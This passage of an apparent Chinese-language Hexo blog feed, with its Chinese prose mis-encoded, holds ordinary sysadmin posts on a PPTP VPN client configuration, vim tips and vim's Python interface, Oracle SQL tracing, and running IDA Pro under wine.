class="hljs-string">&quot;pptp *.99.*27.1*0 --nolaunchpppd&quot;</span><br>name xxx<br>remotename PPTP<br><span class="hljs-keyword">file</span> <span class="hljs-regexp">/etc/</span>ppp/<span class="hljs-keyword">options</span>.pptp<br>ipparam vpn<br><br><span class="hljs-regexp">/etc/</span>ppp/chap-secrets<br><br>user PPTP password *.<span class="hljs-number">99</span>.*<span class="hljs-number">27.1</span>*<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="http://shyju.wordpress.com/2013/08/13/linux-as-a-pptp-vpn-client-configuration-centosfedora/">http://shyju.wordpress.com/2013/08/13/linux-as-a-pptp-vpn-client-configuration-centosfedora/</a><br><a href="http://www.cyberciti.biz/tips/howto-configure-ubuntu-fedora-linux-pptp-client.html">http://www.cyberciti.biz/tips/howto-configure-ubuntu-fedora-linux-pptp-client.html</a><br><a href="http://pptpclient.sourceforge.net/">http://pptpclient.sourceforge.net/</a><br><a href="https://ppp.samba.org/index.html">https://ppp.samba.org/index.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vim ä½¿ç”¨çš„å‡ ä¸ªå°æŠ€å·§</title>
    <link href="/cn/vim_tips/"/>
    <url>/cn/vim_tips/</url>
    
    <content type="html"><![CDATA[<h2 id="0-å°†tab-æ›¿æ¢ä¸ºç©ºæ ¼"><a href="#0-å°†tab-æ›¿æ¢ä¸ºç©ºæ ¼" class="headerlink" title="0.  å°†tab æ›¿æ¢ä¸ºç©ºæ ¼"></a>0.  å°†tab æ›¿æ¢ä¸ºç©ºæ ¼</h2><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">:<span class="hljs-keyword">ret</span><br></code></pre></td></tr></table></figure><h2 id="1-å…¨æ–‡æ ¼å¼åŒ–"><a href="#1-å…¨æ–‡æ ¼å¼åŒ–" class="headerlink" title="1. å…¨æ–‡æ ¼å¼åŒ–"></a>1. å…¨æ–‡æ ¼å¼åŒ–</h2><p>normalæ¨¡å¼ä¸‹ï¼Œ<code>gg=G</code></p><h2 id="2-è·³è½¬åˆ°ä¸Šæ¬¡ç¼–è¾‘å¤„"><a href="#2-è·³è½¬åˆ°ä¸Šæ¬¡ç¼–è¾‘å¤„" class="headerlink" title="2. è·³è½¬åˆ°ä¸Šæ¬¡ç¼–è¾‘å¤„"></a>2. è·³è½¬åˆ°ä¸Šæ¬¡ç¼–è¾‘å¤„</h2><p>normalæ¨¡å¼ä¸‹ï¼Œ<code>&#39;.</code></p><h2 id="3-æ›¿æ¢è¡Œå°¾å¤šä½™çš„ç©ºæ ¼"><a href="#3-æ›¿æ¢è¡Œå°¾å¤šä½™çš„ç©ºæ ¼" class="headerlink" title="3. æ›¿æ¢è¡Œå°¾å¤šä½™çš„ç©ºæ ¼"></a>3. æ›¿æ¢è¡Œå°¾å¤šä½™çš„ç©ºæ ¼</h2><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">:%s=</span> *<span class="hljs-variable">$=</span>=<br></code></pre></td></tr></table></figure><h2 id="4-Source-your-vimrc"><a href="#4-Source-your-vimrc" class="headerlink" title="4. Source your vimrc."></a>4. Source your vimrc.</h2><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">:so</span> <span class="hljs-variable">$MYVIMRC</span><br></code></pre></td></tr></table></figure><h2 id="5-åœ¨æ–‡ä»¶ä¸­è·³è½¬"><a href="#5-åœ¨æ–‡ä»¶ä¸­è·³è½¬" class="headerlink" title="5. åœ¨æ–‡ä»¶ä¸­è·³è½¬"></a>5. åœ¨æ–‡ä»¶ä¸­è·³è½¬</h2><p>normal æ¨¡å¼ä¸‹ï¼Œ<code>ctrl-o</code></p><h2 id="6-å†…ç½®æ–‡ä»¶æµè§ˆå™¨"><a href="#6-å†…ç½®æ–‡ä»¶æµè§ˆå™¨" class="headerlink" title="6. å†…ç½®æ–‡ä»¶æµè§ˆå™¨"></a>6. å†…ç½®æ–‡ä»¶æµè§ˆå™¨</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">:<span class="hljs-built_in">Exp</span><br></code></pre></td></tr></table></figure><h2 id="7-ä¸€çœ¼çœ‹å‡ºtabå’Œç©ºæ ¼çš„åŒºåˆ«"><a href="#7-ä¸€çœ¼çœ‹å‡ºtabå’Œç©ºæ ¼çš„åŒºåˆ«" class="headerlink" title="7. ä¸€çœ¼çœ‹å‡ºtabå’Œç©ºæ ¼çš„åŒºåˆ«"></a>7. ä¸€çœ¼çœ‹å‡ºtabå’Œç©ºæ ¼çš„åŒºåˆ«</h2><p>åœ¨.vimrc ä¸­æ·»åŠ ä¸‹é¢è¡Œï¼Œ</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> list <span class="hljs-attribute">listchars</span>=tab:&gt;-,trail:.,extends:&gt; <br></code></pre></td></tr></table></figure><h2 id="8-è§£å†³-vim-ç¼–è¯‘æ—¶æƒé™ä¸å¤Ÿé—®é¢˜"><a href="#8-è§£å†³-vim-ç¼–è¯‘æ—¶æƒé™ä¸å¤Ÿé—®é¢˜" class="headerlink" title="8. è§£å†³ vim ç¼–è¯‘æ—¶æƒé™ä¸å¤Ÿé—®é¢˜"></a>8. è§£å†³ vim ç¼–è¯‘æ—¶æƒé™ä¸å¤Ÿé—®é¢˜</h2><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">:w !sudo tee <span class="hljs-comment">%</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
      <tag>vim</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vimä¸­çš„python</title>
    <link href="/cn/vim_python/"/>
    <url>/cn/vim_python/</url>
    
    <content type="html"><![CDATA[<h2 id="1-åˆ¤æ–­vimæ”¯æŒpython"><a href="#1-åˆ¤æ–­vimæ”¯æŒpython" class="headerlink" title="1. åˆ¤æ–­vimæ”¯æŒpython"></a>1. åˆ¤æ–­vimæ”¯æŒpython</h2><p>è¦åˆ¤æ–­ä½ çš„vimæ˜¯å¦æ”¯æŒpythonï¼Œå¯ä»¥æ‰§è¡Œä¸‹é¢å‘½ä»¤ï¼š</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">$ <span class="hljs-keyword">vim</span> --<span class="hljs-keyword">version</span> | <span class="hljs-keyword">grep</span> <span class="hljs-keyword">python</span><br></code></pre></td></tr></table></figure><p>å¦‚æœæ˜¾ç¤ºçš„ç»“æœä¸­æœ‰ +python çš„è¯ï¼Œä½ çš„vimå·²ç»æ”¯æŒpythonï¼Œ<br>å¦‚æœæ²¡æœ‰çš„è¯ï¼Œä½ éœ€è¦é‡æ–°ç¼–è¯‘vimï¼Œåœ¨windowsä¸­å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤è¡Œï¼Œ</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">nmake -f Make_mvc.mak <span class="hljs-attribute">FEATURES</span>=huge <span class="hljs-attribute">PYTHON</span>=D:\Python27 <span class="hljs-attribute">PYTHON_VER</span>=27 <span class="hljs-attribute">GUI</span>=<span class="hljs-literal">yes</span> <span class="hljs-attribute">IME</span>=<span class="hljs-literal">yes</span><br></code></pre></td></tr></table></figure><h2 id="2-ä¸ºä»€ä¹ˆéœ€è¦ç¼–è¯‘æ”¯æŒpythonçš„vim"><a href="#2-ä¸ºä»€ä¹ˆéœ€è¦ç¼–è¯‘æ”¯æŒpythonçš„vim" class="headerlink" title="2. ä¸ºä»€ä¹ˆéœ€è¦ç¼–è¯‘æ”¯æŒpythonçš„vim"></a>2. ä¸ºä»€ä¹ˆéœ€è¦ç¼–è¯‘æ”¯æŒpythonçš„vim</h2><p>ä¸»è¦çš„ç†ç”±æœ‰ä¸¤ä¸ªï¼Œ</p><ol><li>å¯ä»¥ä½¿ç”¨pythonå†™çš„vimæ’ä»¶ã€‚</li><li>vim 7.4 ä»¥åå¯¹pythonçš„æ”¯æŒè¿›è¡Œäº†å¢å¼ºã€‚</li></ol><p>æœ‰å¾ˆå¤šä¸é”™çš„vim æ’ä»¶ï¼Œè¿™é‡Œç»™å¤§å®¶æ¨èä¸€ä¸ªpython-mode, éå¸¸ä¸é”™ã€‚<a href="https://github.com/klen/python-mode">https://github.com/klen/python-mode</a></p><p>vim 7.4 ä»¥åå¯¹pythonçš„æ”¯æŒè¿›è¡Œäº†å¢å¼ºï¼Œè¿™ä¸ªæ˜¯å¹¿å¤§vimæ³¨å†Œç”¨æˆ·ï¼ˆæé’±çš„ç”¨æˆ·ï¼‰å‘¼å£°æœ€<br>é«˜çš„éœ€æ±‚ï¼ŒåŸè¯ä¸ºï¼Œ</p><blockquote><p>add integration with Python instead of inventing more Vim script</p></blockquote><p>ç¡®å®ç°åœ¨å·²ç»æœ‰å¤ªå¤šçš„vimè„šæœ¬äº†ã€‚vimçš„ä¸»é¡µä¸Šçš„å®Œæ•´éœ€æ±‚åˆ—è¡¨; <a href="http://www.vim.org/sponsor/vote_results.php">http://www.vim.org/sponsor/vote_results.php</a></p><blockquote><p>add IDE features (debugger integration, shell window)</p></blockquote><p>è¿™ä¸ªæ˜¯æ’è¡Œè€äºŒçš„éœ€æ±‚ï¼Œä¸çŸ¥é“ä»€ä¹ˆæ—¶ä¾¯èƒ½å®ç°ï¼ŒæœŸå¾…ä¸­â€¦</p><h2 id="3-ä¸€äº›åº”ç”¨ä¸¾ä¾‹"><a href="#3-ä¸€äº›åº”ç”¨ä¸¾ä¾‹" class="headerlink" title="3. ä¸€äº›åº”ç”¨ä¸¾ä¾‹"></a>3. ä¸€äº›åº”ç”¨ä¸¾ä¾‹</h2><h3 id="3-1-python-commands"><a href="#3-1-python-commands" class="headerlink" title="3.1 python commands"></a>3.1 python commands</h3><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">:<span class="hljs-comment">[range]</span>py<span class="hljs-comment">[thon]</span> &#123;stmt&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå‘½ä»¤æ¯”è¾ƒç®€å•ï¼Œè¯¦ç»†è§£é‡Šå¦‚ä¸‹:</p><p>range æ˜¯æ ‡å‡†çš„vimçš„range ç†Ÿæ‚‰vimæ›¿æ¢å‘½ä»¤çš„åŒå­¦åº”è¯¥éƒ½ä¸ä¼šé™Œç”Ÿã€‚rangeçš„ä½œç”¨çš„æ˜¯æŒ‡<br>å®špythonå‘½ä»¤å½±å“å“ªäº›è¡Œï¼Œå†™æ³•ä¸º [è¡Œå·ï¼Œè¡Œå·]ï¼Œæ¯”å¦‚ 1,2  å½±å“ç¬¬ä¸€è¡Œå’Œç¬¬äºŒè¡Œï¼Œ1,$<br>å½±å“æ•´ä¸ªæ–‡ä»¶ã€‚[] çš„æ„æ€æ˜¯è¿™ä¸ªrangeæ˜¯å¯é€‰çš„é»˜è®¤å°†å½±å“æ•´ä¸ªæ–‡ä»¶ã€‚</p><p>py[thon]çš„æ„æ€ä¸ºï¼Œpython æ˜¯å‘½ä»¤çš„å…¨å†™ï¼Œå¯ä»¥ç®€å†™ä¸ºpyã€‚</p><p>{stmt} python è¯­å¥</p><p>å¯ä»¥å†™ä¸Šä¸‹é¢å‘½ä»¤ï¼Œè¾“å‡º Hello</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">:<span class="hljs-keyword">python</span> <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Hello python&quot;</span><br></code></pre></td></tr></table></figure><p>æ•°å­¦ä¸å¥½çš„åŒå­¦å¯ä»¥åƒæˆ‘ä¸€æ ·ä½¿ç”¨</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">:py <span class="hljs-built_in">print</span> 1+1<br></code></pre></td></tr></table></figure><p>å°†æ˜¾ç¤ºç»“æœ2  :)</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">:[range]py[thon] &lt;&lt; </span><span class="hljs-template-variable">&#123;endmarker&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;script&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;endmarker&#125;</span><br></code></pre></td></tr></table></figure><p>ä¸Šé¢æ˜¯è¿™ä¸ªå‘½ä»¤æ˜¯ç¬¬äºŒç§ç”¨æ³•ï¼Œå¯ä»¥ç›´æ¥å†™pythonï¼Œç›¸å½“çˆ½ï¼Œå†™æ³•å¾ˆè±¡cat å‘½ä»¤</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cat</span> &gt; /tmp/xx &lt;&lt; <span class="hljs-string">EOF</span><br><span class="hljs-string">....</span><br><span class="hljs-string">EOF</span><br></code></pre></td></tr></table></figure><p>æƒ³ç”¨vimæŸ¥è¯¢å¤©æ°”çš„åŒå­¦å¯ä»¥å‚è€ƒä¸€ä¸‹ï¼Œgithubä¸Šçš„è¿™ä¸ªè„šæœ¬ <a href="https://raw.github.com/liqunli/vim-plugin-dev/master/dairy.vim">https://raw.github.com/liqunli/vim-plugin-dev/master/dairy.vim</a></p><h3 id="3-2-pydo"><a href="#3-2-pydo" class="headerlink" title="3.2 pydo"></a>3.2 pydo</h3><p>è¿™ä¸ªå‘½ä»¤çš„æ ¼å¼ä¸ºï¼Œ :[range]pydo {body}</p><p>vim ä¸­æœ‰ä¸€ä¸ªå®šä¹‰å¥½çš„å‡½æ•°ï¼Œè¿™ä¸ªå‘½ä»¤å°†åˆ©ç”¨è¿™ä¸ªå‡½æ•°åšä¸€äº›äº‹æƒ…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_vim_pydo</span>(<span class="hljs-params">line, linenr</span>):<br>    &#123;body&#125;<br></code></pre></td></tr></table></figure><p>pydo è¿™ä¸ªå‘½ä»¤åŒæ ·æ˜¯ä»¥è¡Œä¸ºå•ä½çš„ï¼Œrangeçš„ç”¨æ³•å’Œä¸Šé¢è¯´çš„ä¸€æ ·ã€‚ line æ˜¯åŸå§‹çš„è¡Œï¼Œ<br>linenr æ˜¯ line number (è¡Œå·ï¼‰ã€‚å¤§å®¶å¯ä»¥çŒœä¸€ä¸‹ä¸‹é¢å‘½ä»¤çš„æ„æ€ï¼Œ</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-meta">:pydo if line:</span> return &quot;%4d: %s&quot; % (linenr, line)<br></code></pre></td></tr></table></figure><p>æ˜¾ç¤ºç»“æœå¤§è‡´æ˜¯è¿™æ ·ï¼Œ ç›´æ¥ç”¨è¿™ä¸ªæ–‡ä»¶æµ‹è¯•äº†ä¸€ä¸‹ï¼Œ</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ldif"><span class="hljs-attribute">55</span>: å°†æ˜¾ç¤ºç»“æœ2  :)<br><br><br><span class="hljs-attribute">58</span>: :[range]py[thon] &lt;&lt; &#123;endmarker&#125;<br><span class="hljs-attribute">59</span>: &#123;script&#125;<br><span class="hljs-attribute">60</span>: &#123;endmarker&#125;<br></code></pre></td></tr></table></figure><p>æ²¡æœ‰æŒ‡å®šrangeï¼Œé»˜è®¤ä¸ºæ•´ä¸ªæ–‡ä»¶ï¼Œâ€%4d: %sâ€ % (linenr, line)  è¿™å¥çš„æ„æ€æ˜¯ï¼Œ<br>åœ¨æ¯è¡Œå‰åŠ è¡Œå·ï¼Œä¸è¶³4ä½çš„æ•°å­—çš„ç”¨ç©ºæ ¼è¡¥é½</p><p>åœ¨æ—©äº›æ—¶ä¾¯ï¼Œvimå‘½ä»¤è¦å®ç°è¿™ä¸ªçš„æ•ˆæœï¼Œéœ€è¦å†™ä¸€è¡Œè¯¡å¼‚çš„å‘½ä»¤ï¼Œ</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-meta">:%s/^/\=printf(&#x27;%4d:</span> <span class="hljs-emphasis">&#x27;, line(&#x27;</span>.<span class="hljs-emphasis">&#x27;))</span><br></code></pre></td></tr></table></figure><p>æŒ‘æˆ˜å¤ªå¤§ï¼Œvim è¿˜ä¸“é—¨å†™äº†ä¸€ç¯‡wiki <a href="http://vim.wikia.com/wiki/Insert_line_numbers">http://vim.wikia.com/wiki/Insert_line_numbers</a></p><h3 id="3-3-pyfile"><a href="#3-3-pyfile" class="headerlink" title="3.3 pyfile"></a>3.3 pyfile</h3><p>è¿™æ¡å‘½ä»¤çš„æ ¼å¼ä¸ºï¼Œ:[range]pyf[ile] {file}</p><p>å¯ä»¥ç›´æ¥ä½¿ç”¨python æ–‡ä»¶ï¼Œä¸éœ€è¦ä¸€å¥ä¸€å¥çš„è¾“å…¥python è¯­å¥äº†ã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">:<span class="hljs-keyword">python</span> from <span class="hljs-keyword">vim</span> import *<br>:<span class="hljs-keyword">python</span> from <span class="hljs-built_in">string</span> import upper<br>:<span class="hljs-keyword">python</span> current.<span class="hljs-built_in">line</span> = upper(current.<span class="hljs-built_in">line</span>)<br>:<span class="hljs-keyword">python</span> <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Hello&quot;</span><br>:<span class="hljs-keyword">python</span> str = current.<span class="hljs-keyword">buffer</span>[<span class="hljs-number">42</span>]<br></code></pre></td></tr></table></figure><h3 id="3-4-python3"><a href="#3-4-python3" class="headerlink" title="3.4  python3"></a>3.4  python3</h3><p>å‘½ä»¤çš„æ ¼å¼å’Œpythonæ˜¯ä¸€æ ·çš„ï¼Œä¸è¿‡éœ€è¦å¼€å¯ +python3</p><h3 id="3-5-vimçš„python-æ¥å£"><a href="#3-5-vimçš„python-æ¥å£" class="headerlink" title="3.5  vimçš„python æ¥å£"></a>3.5  vimçš„python æ¥å£</h3><p>è¿™ä¸ªä¸å±äºè¿™ä¸ªå°æ–‡ç« çš„æƒ³è¯´çš„äº†ï¼Œå†™äº†è¿™æˆvimçš„manualäº†ï¼Œå¯ä»¥ç›´æ¥å‚çœ‹:<br><a href="http://vimhelp.appspot.com/if_pyth.txt.html#python-vim">http://vimhelp.appspot.com/if_pyth.txt.html#python-vim</a></p><h2 id="4-æœ€å"><a href="#4-æœ€å" class="headerlink" title="4. æœ€å"></a>4. æœ€å</h2><p>ä¸ºäº†é¿å…vimå’Œemacsçš„åœ£æˆ˜ï¼Œhx å’Œ lzxç­‰emacså…šï¼Œå¯ä»¥ç›´æ¥å¿½è§†æ­¤æ–‡ ï¼šï¼‰</p><h2 id="5-å‚è€ƒèµ„æ–™"><a href="#5-å‚è€ƒèµ„æ–™" class="headerlink" title="5. å‚è€ƒèµ„æ–™"></a>5. å‚è€ƒèµ„æ–™</h2><p><a href="http://vimhelp.appspot.com/if_pyth.txt.html">http://vimhelp.appspot.com/if_pyth.txt.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>vim</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Oracle æ•°æ®åº“å¦‚ä½•trace æ‰§è¡Œçš„SQL statement</title>
    <link href="/cn/oracle_statement_trace/"/>
    <url>/cn/oracle_statement_trace/</url>
    
    <content type="html"><![CDATA[<p>Q.  Oracle æ•°æ®åº“å¦‚ä½•traceæ‰§è¡Œçš„SQL statement</p><h2 id="1-å¼€å¯trace"><a href="#1-å¼€å¯trace" class="headerlink" title="1. å¼€å¯trace"></a>1. å¼€å¯trace</h2><p>æ–¹æ³•(1) : æ‰§è¡ŒSQLè¯­å¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SQL</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">alter</span> <span class="hljs-keyword">system</span> <span class="hljs-keyword">set</span> sql_trace <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">SQL</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">alter</span> <span class="hljs-keyword">system</span> <span class="hljs-keyword">SET</span> EVENTS <span class="hljs-string">&#x27;10046 trace name context forever, level 12&#x27;</span>;<br></code></pre></td></tr></table></figure><p>æ–¹æ³•(2) : ä¿®æ”¹init.ora é…ç½®æ–‡ä»¶</p><p>è¿˜å¯ä»¥ä¿®æ”¹init.ora æ–‡ä»¶æ·»åŠ  event&#x3D;â€10046 trace name context forever,level 12â€  æ¥è¾¾åˆ°ç›®çš„ï¼Œ<br>ä¿®æ”¹ä»¥åéœ€è¦é‡æ–°å¯åŠ¨æ•°æ®åº“ã€‚</p><h2 id="2-å…³é—­-trace"><a href="#2-å…³é—­-trace" class="headerlink" title="2. å…³é—­ trace"></a>2. å…³é—­ trace</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SQL</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">alter</span> <span class="hljs-keyword">system</span> <span class="hljs-keyword">set</span> EVENTS <span class="hljs-string">&#x27;10046 trace name context off&#x27;</span>;<br></code></pre></td></tr></table></figure><h2 id="3-traceç›¸å…³çš„å‡ ä¸ªå‚æ•°"><a href="#3-traceç›¸å…³çš„å‡ ä¸ªå‚æ•°" class="headerlink" title="3. traceç›¸å…³çš„å‡ ä¸ªå‚æ•°"></a>3. traceç›¸å…³çš„å‡ ä¸ªå‚æ•°</h2><ul><li>MAX_DUMP_FILE_SIZE    dump æ–‡ä»¶å¤§å°</li><li>USER_DUMP_DEST           dump æ–‡ä»¶è·¯å¾„</li></ul><p>å¯ä»¥ä½¿ç”¨ä¸‹é¢è¯­å¥å‚çœ‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SQL</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">show</span> <span class="hljs-keyword">parameter</span> user_dump_dest;<br><br>NAME     TYPE <span class="hljs-keyword">VALUE</span><br><span class="hljs-comment">------------------------------------ ----------- ------------------------------</span><br>user_dump_dest     string <span class="hljs-operator">/</span>u01<span class="hljs-operator">/</span>app<span class="hljs-operator">/</span>diag<span class="hljs-operator">/</span>rdbms<span class="hljs-operator">/</span>orcl<span class="hljs-operator">/</span>orcl<span class="hljs-operator">/</span>trace<br><br><br><span class="hljs-keyword">SQL</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">show</span> <span class="hljs-keyword">parameter</span> max_dump_file_size;<br><br>NAME     TYPE <span class="hljs-keyword">VALUE</span><br><span class="hljs-comment">------------------------------------ ----------- ------------------------------</span><br>max_dump_file_size     string unlimited<br></code></pre></td></tr></table></figure><h2 id="4-trc-æ–‡ä»¶åˆ†æ"><a href="#4-trc-æ–‡ä»¶åˆ†æ" class="headerlink" title="4.  trc æ–‡ä»¶åˆ†æ"></a>4.  trc æ–‡ä»¶åˆ†æ</h2><p>æ–¹æ³•(1)</p><p>å¯ä»¥ä½¿ç”¨trc2sql.pl æ¥æå–trcæ–‡ä»¶ä¸­çš„SQLè¯­å¥</p><p>ä¸‹è½½åœ°å€: <a href="https://gist.github.com/henices/5097678">https://gist.github.com/henices/5097678</a></p><p>æ–¹æ³•(2)</p><p>oracleæä¾›tkprof å‘½ä»¤å¯ä»¥è§£ætrcæ–‡ä»¶ï¼Œä½¿ç”¨æ–¹æ³•ä¸ºï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ tkprof tracefile outputfile<br></code></pre></td></tr></table></figure><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p>å‚è€ƒé“¾æ¥ï¼š <a href="http://www.eygle.com/case/Use.sql_trace.to.Diagnose.database.htm">http://www.eygle.com/case/Use.sql_trace.to.Diagnose.database.htm</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux ä¸‹è¿è¡Œ IDA Pro</title>
    <link href="/cn/linux_ida_pro/"/>
    <url>/cn/linux_ida_pro/</url>
    
    <content type="html"><![CDATA[<p>IDA Pro 6.2 + çš„Linux ç‰ˆæœ¬æä¾›äº†Qt ç•Œé¢ï¼Œå¯ä»¥åœ¨å„å¤§å¹³å°æ­£å¸¸è¿è¡Œã€‚ä¹°ä¸èµ·ä¹Ÿæœ‰åŠæ³• ï¼Œä½¿ç”¨ wine å¯ä»¥å¾ˆå¥½åœ°è¿è¡ŒIDA Proï¼Œæ˜¾ç¤ºæ•ˆæœåŸºæœ¬OKï¼Œçˆ±æŠ˜è…¾çš„åŒå­¦å¯ä»¥è‡ªè¡Œè°ƒæ•´å­—ä½“ã€‚</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>wine idag.exe<br></code></pre></td></tr></table></figure><p>IDA Pro 6.1 æˆåŠŸè¿è¡Œ.ä½†æ˜¯idapython æœ‰äº›é—®é¢˜éœ€è¦å¤„ç†ï¼Œå¼•èµ·idapythonä¸èƒ½æ­£å¸¸è¿è¡Œçš„åŸå› ä¸»è¦æœ‰ä¸‹é¢ä¸¤ä¸ªï¼š</p><h2 id="æ–‡ä»¶ç¼ºå¤±"><a href="#æ–‡ä»¶ç¼ºå¤±" class="headerlink" title="æ–‡ä»¶ç¼ºå¤±"></a>æ–‡ä»¶ç¼ºå¤±</h2><p>å¤§æ¦‚ä¼šæŠ¥ä¸‹é¢é”™è¯¯ </p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">err:<span class="hljs-keyword">module</span>:<span class="hljs-keyword">import</span><span class="hljs-number">_</span>dll Library python<span class="hljs-number">27</span>.dll (which <span class="hljs-keyword">is</span> needed <span class="hljs-meta">by</span> L<span class="hljs-string">&quot;C:\\ida61\\plugins\\python.plw&quot;</span>) not found<br></code></pre></td></tr></table></figure><p>è¦è§£å†³è¿™ä¸ªé”™è¯¯ï¼Œéœ€è¦ä»windowsä¸‹æ‹·è´ä¸¤ä¸ªæ–‡ä»¶è¿‡æ¥ï¼Œè¿™ä¸¤ä¸ªæ–‡ä»¶æ˜¯ msvcr90.dllï¼Œpython27.dll</p><h2 id="ç¯å¢ƒå˜é‡"><a href="#ç¯å¢ƒå˜é‡" class="headerlink" title="ç¯å¢ƒå˜é‡"></a>ç¯å¢ƒå˜é‡</h2><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>wine idag.exe<br></code></pre></td></tr></table></figure><p>ä¼šæŠ¥ä¸‹é¢ç±»ä¼¼é”™è¯¯ï¼Œ ImportError: No module named siteï¼Œå‘ç”Ÿè¿™ä¸ªé”™è¯¯çš„åŸå› æ˜¯æ‰¾ä¸åˆ°pythonå®‰è£…è·¯å¾„ï¼Œå¯ä»¥ä½¿ç”¨unixä¸‹çš„pythonä½¿ç”¨shellå‘½ä»¤è®¾ç½®ç¯å¢ƒå˜é‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">export</span> PYTHONPATH=/usr/lib/python2.7/<br>$ wine idag.exe<br></code></pre></td></tr></table></figure><h2 id="Python-é—®é¢˜"><a href="#Python-é—®é¢˜" class="headerlink" title="Python é—®é¢˜"></a>Python 